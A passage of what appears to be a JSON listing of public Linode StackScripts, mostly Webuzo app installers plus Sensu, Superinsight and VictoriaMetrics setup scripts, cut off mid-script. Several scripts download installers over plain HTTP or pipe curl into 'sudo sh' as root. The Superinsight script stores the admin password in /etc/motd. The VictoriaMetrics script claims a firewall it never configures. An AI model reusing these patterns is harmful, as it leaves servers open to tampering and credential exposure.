      framework for developing fast and powerful web interfaces.\r\n\r\nUIkit gives
      you a comprehensive collection of HTML, CSS, and JS components which is simple
      to use, easy to customize and extendable.\r\n\r\nUIkit is open source and MIT
      licensed. It is absolutely free of charge and you can use, copy, merge, publish
      and distribute the framework without any limitations.\r\n\t\t\t\r\nWebuzo is
      a Single User Control Panel which helps users deploy Web Apps (WordPress, Joomla,
      Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their
      virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure UIkit and
      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "UIkit powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install UIkit and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About UIkit :\n#   UIkit
      A lightweight and modular front-end framework for developing fast and powerful
      web interfaces.\n#   UIkit gives you a comprehensive collection of HTML, CSS,
      and JS components which is simple to use, \n#   easy to customize and extendable.\n###########################################################################################################\n\n#
      Install UIkit Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=471&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      UIkit and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, UIkit has been successfully installed\"\necho \" \"\necho
      \"You can now configure UIkit and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 14367, "username":
      "ezan", "user_gravatar_id": "40bba314333f02cceb3f40d8a2aabb78", "label": "install-sensu-flapjack",
      "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\n##\n# Installs the Flapjack handler
      for Sensu\n#\n# Dependencies:\n# - Redis provided for Flapjack\n# - Sensu server\n##\nset
      -eux\n\nsource env.sh\n\ncd /tmp\n\ngit clone git://github.com/sensu/sensu-community-plugins.git\ncp
      sensu-community-plugins/extensions/handlers/flapjack.rb /etc/sensu/extensions/handlers\n\ncp
      $BASE_PATH/etc/sensu/conf.d/flapjack.json /etc/sensu/conf.d", "user_defined_fields":
      []}, {"id": 11040, "username": "zhangfan", "user_gravatar_id": "6378c7beab2f878c31ff5c112efbd437",
      "label": "StackScript", "description": "", "ordinal": 0, "logo_url": "", "images":
      ["linode/debian6"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "Initial import", "script": "#!StackScript", "user_defined_fields":
      []}, {"id": 14368, "username": "ezan", "user_gravatar_id": "40bba314333f02cceb3f40d8a2aabb78",
      "label": "install-uchiwa", "description": "", "ordinal": 0, "logo_url": "",
      "images": ["linode/ubuntu14.04lts"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n##\n#
      Installs Uchiwa, a multi-datacenter dashboard for Sensu\n#\n# Provides:\n# -
      HTTP (TCP/8010)\n#\n# Dependencies:\n# - Sensu API\n##\nset -eux\n\nsource env.sh\n\n$BASE_PATH/install-sensu.sh\n\napt-get
      install -yq uchiwa\n\ncp $BASE_PATH/etc/sensu/uchiwa.json /etc/sensu\n\nupdate-rc.d
      uchiwa defaults\n\nservice uchiwa restart", "user_defined_fields": []}, {"id":
      764448, "username": "br01fox", "user_gravatar_id": "aed368e47ef5ba2d07e560d71868f8b5",
      "label": "Slackware is fun ", "description": "", "ordinal": 0, "logo_url": "",
      "images": ["linode/slackware14.1"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Slackware", "script": "#!/bin/bash\n\nSlackware
      is fun.", "user_defined_fields": []}, {"id": 8993, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "AbanteCart powered by Webuzo",
      "description": "Abante Cart is a free PHP based eCommerce solution for merchants
      to provide ability creating online business and sell products online quick and
      efficient.\r\n\r\nAbanteCart application is built and supported by experienced
      enthusiasts that are passionate about their work and contribution to rapidly
      evolving eCommerce industry.\r\n\r\nAbanteCart is more than just a shopping
      cart, it is rapidly growing eCommerce platform with many benefits. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      AbanteCart and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "AbanteCart powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install AbanteCart and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About AbanteCart :\n#   Abante
      Cart is a free PHP based eCommerce solution for merchants to provide ability
      creating online \n#   business and sell products online quick and efficient.
      \n###########################################################################################################\n\n#
      Install AbanteCart Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=389&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      AbanteCart and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, AbanteCart has been successfully installed\"\necho \" \"\necho
      \"You can now configure AbanteCart and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9249, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "SiteCake
      powered by Webuzo", "description": "SiteCake is a drag and drop CMS for simple
      websites. It lets you publish the content just by dragging it to your web page.
      It''s CMS for static websites, with few pages only, to cover the niche below
      WordPress level of complexity.\r\n\r\nSiteCake was designed to be simple enough
      for a designer to integrate it on their own, without a need to hire a developer.
      SiteCake was designed to be simple enough for a site owner to change some text,
      swap some photos and add a video on their own, without a need to hire a web
      editor.\r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users
      deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX,
      PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure SiteCake
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "SiteCake powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install SiteCake and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About SiteCake :\n#   SiteCake
      is a drag and drop CMS for simple websites.\n#   It lets you publish the content
      just by dragging it to your web page.\n#   It''s CMS for static websites, with
      few pages only, to cover the niche below WordPress level of complexity.\n###########################################################################################################\n\n#
      Install SiteCake Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=480&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      SiteCake and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, SiteCake has been successfully installed\"\necho \" \"\necho
      \"You can now configure SiteCake and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 8994, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Joomla
      powered by Webuzo", "description": "Joomla is an award-winning content management
      system (CMS), which enables you to build Web sites and powerful online applications.
      Many aspects, including its ease-of-use and extensibility, have made Joomla
      the most popular Web site software available. Best of all, Joomla is an open
      source solution that is freely available to everyone. \r\n\t\t\t\r\nWebuzo is
      a Single User Control Panel which helps users deploy Web Apps (WordPress, Joomla,
      Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their
      virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Joomla
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Joomla powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Joomla and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Joomla :\n#   Joomla
      is an award-winning content management system (CMS), which enables you to build
      Web sites \n#   and powerful online applications. Many aspects, including its
      ease-of-use and extensibility, have made \n#   Joomla the most popular Web site
      software available. Best of all, Joomla is an open source \n#   solution that
      is freely available to everyone.\n###########################################################################################################\n\n#
      Install Joomla Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=413&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Joomla and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Joomla has been successfully installed\"\necho \" \"\necho
      \"You can now configure Joomla and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1193763, "username":
      "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd", "label":
      "Superinsight One-Click", "description": "Superinsight One-Click app", "ordinal":
      0, "logo_url": "", "images": ["linode/ubuntu22.04"], "deployments_total": 0,
      "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/usr/bin/bash\n\n##
      REQUIRED IN EVERY MARKETPLACE SUBMISSION\n# Add Logging to /var/log/stackscript.log
      for future troubleshooting\nexec 1> >(tee -a \"/var/log/stackscript.log\") 2>&1\n#
      System Updates updates\napt-get -o Acquire::ForceIPv4=true update -y\n## END
      OF REQUIRED CODE FOR MARKETPLACE SUBMISSION\n\n# Install docker\ncurl -fsSL
      get.docker.com | sudo sh\n\n# Creating Password\necho \"Superinsight setting
      up password....\"\nADMIN_PASSWORD=$(openssl rand -hex 12)\nNODE_IP=$(hostname
      -I | cut -f1 -d'' '')\necho \"Downloading and Installing Superinsight instance......\"\n\n#
      Install Superinsight\ndocker run \\\n--detach \\\n--name superinsight-db-standalone
      \\\n--restart always \\\n-p 5432:5432 \\\n-v vol-superinsight:/db \\\n-e SUPERINSIGHT_USER=admin
      \\\n-e SUPERINSIGHT_PASSWORD=\"${ADMIN_PASSWORD}\" \\\nsuperinsight/superinsight-db-standalone:latest\n\n\n#
      Print instructions\ncat << EOF > /etc/motd\n\n################################################################################################################################################\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tSUPERINSIGHT\n################################################################################################################################################\n\nSuperinsight
      created the user admin with password: ${ADMIN_PASSWORD}\nYou can can connect
      using a database client with the following connection string postgres://admin:${ADMIN_PASSWORD}@${NODE_IP}:5432/superinsight\nFor
      complete source code and information, visit: https://github.com/superinsight/superinsight-db\n\n################################################################################################################################################\nEOF",
      "user_defined_fields": []}, {"id": 8996, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "MyBB powered by Webuzo", "description":
      "MyBB is a free bulletin board system software package developed by the MyBB
      Group. \r\n\r\nA lot of thought has gone into the MyBB interface to make it
      easy to use. MyBB uses a standard discussion board structure, so your visitors
      will feel familiar with the way MyBB works.\r\n\t\t\t\r\nWebuzo is a Single
      User Control Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal,
      etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual
      machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure MyBB and
      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "MyBB powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install MyBB and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About MyBB :\n#   MyBB
      is a free bulletin board system software package developed by the MyBB Group.\n###########################################################################################################\n\n#
      Install MyBB Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=36&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      MyBB and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, MyBB has been successfully installed\"\necho \" \"\necho
      \"You can now configure MyBB and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9252, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Pebble
      powered by Webuzo", "description": "Pebble is a lightweight, open source, Java
      EE blogging tool. It''s small, fast and feature-rich with unrivalled ease of
      installation and use.\r\n\r\nBlog content is stored as XML files on disk and
      served up dynamically, so there''s no need to install a database. All maintenance
      and administration can be performed through your web browser, making Pebble
      ideal for anybody who is constantly on the move or doesn''t have direct access
      to their host. \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps
      users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache,
      NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Pebble
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Pebble powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Pebble and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Pebble :\n#   Pebble
      is a lightweight, open source, Java EE blogging tool.\n#   It''s small, fast
      and feature-rich with unrivalled ease of installation and use.\n###########################################################################################################\n\n#
      Install Pebble Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=429&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Pebble and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Pebble has been successfully installed\"\necho \" \"\necho
      \"You can now configure Pebble and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 355877, "username":
      "evin2", "user_gravatar_id": "9db591667a2b7decad610db319c613bc", "label": "Epasqualetti",
      "description": "Test to call stackscript with label", "ordinal": 0, "logo_url":
      "", "images": ["linode/gentoo"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n\n#
      It works!", "user_defined_fields": []}, {"id": 1094693, "username": "santiachinelli",
      "user_gravatar_id": "5a5ea404116429697319f684006d6b93", "label": "loltest-public",
      "description": "loltest-public", "ordinal": 0, "logo_url": "", "images": ["any/all"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "created, public version", "script": "#!/bin/bash\n# <UDF name=\"hostname\"
      label=\"Hostname\" />\nsource <ssinclude StackScriptID=\"1\">\nsystem_set_hostname
      \"$HOSTNAME\"\nexec > >(tee /dev/ttyS0 /var/log/stackscript.log) 2>&1\napt update
      && apt upgrade -y && apt install -y curl wget net-tools traceroute jq\n# Generate
      files\nmkdir -p /etc/victoriametrics/single\nmkdir -p /var/lib/victoria-metrics-data\nmkdir
      -p /var/lib/cloud/scripts/per-instance\n# Create victoriametrics user\ngroupadd
      -r victoriametrics\nuseradd -g victoriametrics -d /var/lib/victoria-metrics-data
      -s /sbin/nologin --system victoriametrics\nchown -R victoriametrics:victoriametrics
      /var/lib/victoria-metrics-data\n# Install VictoriaMetrics Single\nVM_VERSION=`curl
      -sg \"https://api.github.com/repos/VictoriaMetrics/VictoriaMetrics/tags\" |
      jq -r ''.[0].name''`\nwget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/${VM_VERSION}/victoria-metrics-linux-amd64-${VM_VERSION}.tar.gz  -O
      /tmp/victoria-metrics.tar.gz\ntar xvf /tmp/victoria-metrics.tar.gz -C /usr/bin\nchmod
      +x /usr/bin/victoria-metrics-prod\nchown root:root /usr/bin/victoria-metrics-prod\ntouch
      /etc/victoriametrics/single/scrape.yml\nchown root:root /etc/victoriametrics/single/scrape.yml\ncat
      <<END >/etc/systemd/system/vmsingle.service\n[Unit]\nDescription=VictoriaMetrics
      is a fast, cost-effective and scalable monitoring solution and time series database.\n#
      https://docs.victoriametrics.com\nAfter=network.target\n[Service]\nType=simple\nUser=victoriametrics\nGroup=victoriametrics\nWorkingDirectory=/var/lib/victoria-metrics-data\nStartLimitBurst=5\nStartLimitInterval=0\nRestart=on-failure\nRestartSec=5\nEnvironmentFile=-/etc/victoriametrics/single/victoriametrics.conf\nExecStart=/usr/bin/victoria-metrics-prod
      \\$ARGS\nExecStop=/bin/kill -s SIGTERM \\$MAINPID\nExecReload=/bin/kill -HUP
      \\$MAINPID\n# See docs https://docs.victoriametrics.com/Single-server-VictoriaMetrics.html#tuning\nProtectSystem=full\nLimitNOFILE=1048576\nLimitNPROC=1048576\nLimitCORE=infinity\nStandardOutput=syslog\nStandardError=syslog\nSyslogIdentifier=vmsingle\n[Install]\nWantedBy=multi-user.target\nEND\ncat
      <<END >/etc/victoriametrics/single/victoriametrics.conf\n# See https://docs.victoriametrics.com/Single-server-VictoriaMetrics.html#list-of-command-line-flags
      to get more information about supported command-line flags\n# \n# If you use
      IPv6 pleas add \"-enableTCP6\" to args line\nARGS=\"-promscrape.config=/etc/victoriametrics/single/scrape.yml
      -storageDataPath=/var/lib/victoria-metrics-data -retentionPeriod=12 -httpListenAddr=:8428
      -graphiteListenAddr=:2003 -opentsdbListenAddr=:4242 -influxListenAddr=:8089
      -enableTCP6\"\nEND\ncat <<END </etc/victoriametrics/single/scrape.yml\n# Scrape
      config example\n#\nscrape_configs:\n  - job_name: self_scrape\n    scrape_interval:
      10s\n    static_configs:\n      - targets: [''127.0.0.1:8428''] \nEND\ncat <<END
      > /etc/profile.d/victoriametrics_welcome.sh\n#!/bin/sh\n#\nmyip=$(hostname -I
      | awk ''{print$1}'')\n********************************************************************************
      \nWelcome to VictoriaMetrics Single.\nTo keep this server secure, the UFW firewall
      is enabled.\nAll ports are BLOCKED except 22 (SSH), 80 (HTTP), and 443 (HTTPS),
      8428 (VictoriaMetrics HTTP), 8089 (VictoriaMetrics Influx),\n4242 (VictoriaMetrics
      OpenTSDB), 2003 (VictoriaMetrics Graphite)\nIn a web browser, you can view:\n
      * The VictoriaMetrics Quickstart guide: https://kutt.it/1click-quickstart\nOn
      the server:\n  * The default VictoriaMetrics root is located at /var/lib/victoria-metrics-data\n  *
      VictoriaMetrics is running on ports: 8428, 8089, 4242, 2003 and they are bound
      to the local interface.\n********************************************************************************\n  #
      This image includes version v1.74.0 of VictoriaMetrics. \n  # See Release notes
      https://github.com/VictoriaMetrics/VictoriaMetrics/releases/tag/v1.70.0\n  #
      Welcome to VictoriaMetrics droplet!\n  # Website:       https://victoriametrics.com\n  #
